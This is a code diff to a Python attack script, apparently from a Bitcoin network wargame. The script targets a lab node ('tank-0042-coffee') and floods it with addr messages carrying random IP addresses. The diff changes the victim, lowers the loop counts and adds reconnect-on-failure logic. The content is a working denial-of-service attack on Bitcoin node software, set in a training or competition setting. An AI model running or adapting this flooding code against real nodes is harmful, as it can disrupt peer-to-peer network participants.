@@ -55,7 +55,7 @@ class UnknownMessage(Commander):
         # We know this one is vulnderable to an unknown messages based on it's subver
         # Use either reconnaisance or ForkObserver UI to find vulnerable nodes
         # Change this to your teams colour if running in the battleground
-        victim = "tank-0040-coffee.default.svc"
+        victim = "tank-0042-coffee.default.svc"
 
         # regtest or signet
         chain = self.nodes[0].chain
@@ -78,11 +78,11 @@ class UnknownMessage(Commander):
         )()
         attacker.wait_until(lambda: attacker.is_connected, check_connected=False)
 
-        for i in range(4294967):
+        for i in range(10):
             # for i in range(4294967.296):
-            for i in range(500):
+            for i in range(10):
                 random_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
-                random_port = random.randint(1024, 65535)  # Random high port
+                # random_port = random.randint(1024, 65535)  # Random high port
 
                 # Create an addr message
                 addr = CAddress()
@@ -103,9 +103,17 @@ class UnknownMessage(Commander):
 
                 # Send the message
                 # attacker.send_message(addr_msg)
-            attacker.send_message(addr_msg)
-            if i%10000 == 0:
-                print(f"Sent addr message: {random_ip}:{random_port}. iter {i}")
+            try:
+                attacker.send_and_ping(addr_msg)
+                print(f"Sent addr message: {random_ip}. iter {i}")
+            except Exception as e:
+                print("Perdeu a connection")
+                time.sleep(3)
+                attacker.peer_connect(
+                    dstaddr=dstaddr, dstport=dstport, net="signet", timeout_factor=1
+                )()
+                attacker.wait_for_connect()
+            # if i%10000 == 0:
 
         # time.sleep(0.1)  # Adjust sleep time to control spam rate
 
